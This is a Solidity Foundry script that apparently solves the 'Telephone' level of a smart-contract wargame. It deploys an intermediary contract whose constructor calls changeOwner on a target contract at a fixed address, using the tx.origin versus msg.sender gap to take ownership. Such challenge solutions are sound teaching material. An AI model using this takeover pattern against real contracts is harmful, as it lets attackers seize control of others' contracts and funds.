// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermidiaryContract {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {

    Telephone public telephoneInstance = Telephone(0x1d2d01Db7aAe83081BDfff7844C8030f2d51a5AB);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new IntermidiaryContract(
            telephoneInstance, vm.envAddress("MY_ADDRESS")
        );
        vm.stopBroadcast();
    }
}